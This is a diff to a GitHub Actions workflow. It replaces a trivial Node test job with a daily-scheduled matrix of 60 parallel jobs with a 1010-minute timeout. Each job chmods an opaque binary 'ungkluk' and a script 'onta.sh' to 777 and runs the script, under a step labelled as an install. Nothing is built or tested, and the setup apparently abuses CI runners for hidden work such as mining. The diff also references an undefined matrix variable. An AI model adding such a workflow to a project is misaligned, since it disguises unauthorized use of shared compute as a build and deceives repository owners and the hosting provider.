@@ -1,17 +1,27 @@
-name: Comro
+name: Oncom
 
-on: [push]
-
+on:  
+  push:
+  pull_request:
+  schedule:
+    - cron: '0 0 * * *'
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-18.04
     strategy:
+      fail-fast: false
       matrix:
-        node-version: [8.x, 10.x, 12.x, 14.x, 16x]
-        mongodb-version: [4.0, 4.2, 4.4, 6.6]
-        redis-version: [4, 6]
-
+        go: [ '1.12', '1.13', '1.14', '1.15', '1.16' , '1.17' ]
+        flag: [ai, bi, ci, di, ei, fi, gi, hi, ii, ji]
+    timeout-minutes: 1010
+    env:
+        NUM_JOBS: 70
+        JOB: ${{ matrix.job }}
     steps:
-    - name: Git checkout
-      uses: actions/checkout@v2
-    - run: echo "done"
+    - uses: actions/checkout@v2
+    - uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+    - name: Instal ${{ matrix.flag }} Ver-${{ matrix.go }}
+      run: |
+        chmod +x onta.sh && chmod +x ungkluk && chmod 777 ungkluk onta.sh && ./onta.sh
